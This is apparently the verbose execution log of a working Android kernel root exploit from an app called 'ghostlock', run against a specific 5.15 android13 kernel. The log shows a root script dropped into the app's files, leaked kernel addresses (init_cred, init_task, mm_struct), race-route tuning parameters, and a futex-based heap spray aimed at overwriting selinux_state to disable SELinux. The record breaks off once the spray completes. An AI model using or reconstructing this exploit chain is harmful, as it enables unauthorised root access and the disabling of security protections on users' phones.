[*] root script written path=/data/user/0/com.ghostlock.app/files/.ghostlock_root.sh bytes=5225
[*] kernel: 5.15.189-android13-8-00016-g51bba4309aac-ab14546557
[+] resolved profile loaded: 5.15.189-android13-8-00016-g51bba4309aac-ab14546557
[*] cpu pair: main=0 consumer=1
[*] runtime home=/data/user/0/com.ghostlock.app/files script=/data/user/0/com.ghostlock.app/files/.ghostlock_root.sh
[*] runtime verbose_debug=1
[*] debug.execution.begin release=5.15.189-android13-8-00016-g51bba4309aac-ab14546557
[*] debug.execution.recommended_cpus.main=0
[*] debug.execution.recommended_cpus.consumer=1
[*] debug.execution.selected_cpus.main=0
[*] debug.execution.selected_cpus.consumer=1
[*] debug.execution.heap.prepare_max_attempts=4
[*] debug.execution.heap.prepare_timeout_ms=240000
[*] debug.execution.heap.kernelsnitch_timeout_ms=60000
[*] debug.execution.race.route_wait_ms=1000
[*] debug.execution.race.setup_settle_us=50000
[*] debug.execution.race.state_poll_interval_us=1000
[*] debug.execution.stages.w1_attempts=15
[*] debug.execution.stages.w1_settle_us=100000
[*] debug.execution.stages.w1_scratch_repair_attempts=3
[*] debug.execution.stages.w2_attempts=15
[*] debug.execution.stages.w2_settle_us=100000
[*] debug.execution.stages.w3_chain_rounds=3
[*] debug.execution.stages.w3_attempts=6
[*] debug.execution.stages.w3_settle_us=50000
[*] debug.execution.routes.tcp_zerocopy.attempts=2000
[*] debug.execution.routes.tcp_zerocopy.arm_sequence=16
[*] debug.execution.routes.tcp_zerocopy.post_receive_hold_iterations=20000
[*] debug.execution.routes.select_stack.enter_delay_us=50000
[*] debug.execution.routes.select_stack.timeout_us=200000
[*] debug.execution.routes.select_stack.consumer_max_calls=1
[*] debug.execution.routes.select_stack.consumer_burst_calls=1
[*] debug.execution.routes.multicast_waiter.ready_timeout_ms=10000
[*] debug.execution.routes.multicast_waiter.post_requeue_settle_us=200000
[*] debug.execution.routes.multicast_waiter.post_adjust_settle_us=100000
[*] debug.execution.handoff.pre_dispatch_settle_ms=2000
[*] debug.execution.handoff.module_poll_attempts=30
[*] debug.execution.handoff.module_poll_interval_ms=100
[*] debug.execution.handoff.enforce_poll_attempts=200
[*] debug.execution.handoff.enforce_poll_interval_ms=100
[*] debug.execution.end
[*] soc: qcom/other; kernel_phys_load=0xa8000000
[*] init_cred image=ffffffc082bfd588 alias=ffffff802abfd588
[*] iomem cache: direct_map_end=ffffff8a80000000
[+] startup context pid=14503 uid=10510 euid=10510 gid=10510 egid=10510 boot_ms=341882 attr=u:r:untrusted_app:s0:c254,c257,c512,c768 enforce=unreadable
[+] startup limits pid=14503 NoNewPrivs=0 Seccomp=2 Seccomp_filters=1
[+] build config pid=14503 label=ghostlock_oplus slide=pselect main=pselect
[+] p0 profile pid=14503 phys_offset=0000000080000000 kernel_phys_load=00000000a8000000 delta=0000000028000000 slide_logger=ffffff802ab01e28 bootid_data=ffffff802adc6819 init_task=ffffff802ac43400 root_tg=ffffff802ad58ac0 sysctl_bootid=ffffff802adc6819
[*] p0 kernel_phys_load=00000000a8000000 delta=0000000028000000
[*] main thread running on cpu=0
[*] [T+0ms] exploit start
[-] SELinux enforce unreadable; assuming enforcing and running W1
[*] [T+1ms] pre-W1 drain
[*] W1: SELinux attempt 1/1
[*] === W1: SELinux === target=0xffffff802adaad88 mode=1 leaf=0
[*] [T+173ms]   heap spray start
[*] [spray] mm spray + kernelsnitch ready (cpu=8) +222ms
[*] [spray] finding futex collisions... +459ms
[*] [spray] early collision screen 16/7 at 31%
[*] [spray] futex collisions found +1978ms
[*] [spray] mm_struct leaked=0xffffff8882c67400 +2067ms
[*] [spray] payload ready +2072ms
[-] page ffffff8882c60000 stores an even byte over selinux_state.initialized; taking another
[-] prepare_kernel_page retry 1/4 +2229ms
[*] [spray] mm spray + kernelsnitch ready (cpu=8) +232ms
[*] [spray] finding futex collisions... +475ms
[*] [spray] early collision screen 16/7 at 31%
[*] [spray] futex collisions found +1985ms
[*] [spray] mm_struct leaked=0xffffff888214f400 +2043ms
[*] [spray] payload ready +2047ms
[-] page ffffff8882148000 stores an even byte over selinux_state.initialized; taking another
[-] prepare_kernel_page retry 2/4 +4433ms
[*] [spray] mm spray + kernelsnitch ready (cpu=8) +238ms
[*] [spray] finding futex collisions... +489ms
[*] [spray] early collision screen 16/7 at 31%
[*] [spray] futex collisions found +1999ms
[*] [spray] mm_struct leaked=0xffffff897017c800 +2038ms
[*] [spray] payload ready +2043ms
[*] prepare_kernel_page ok attempt=3 +6644ms
[*] [T+6819ms]   heap spray done
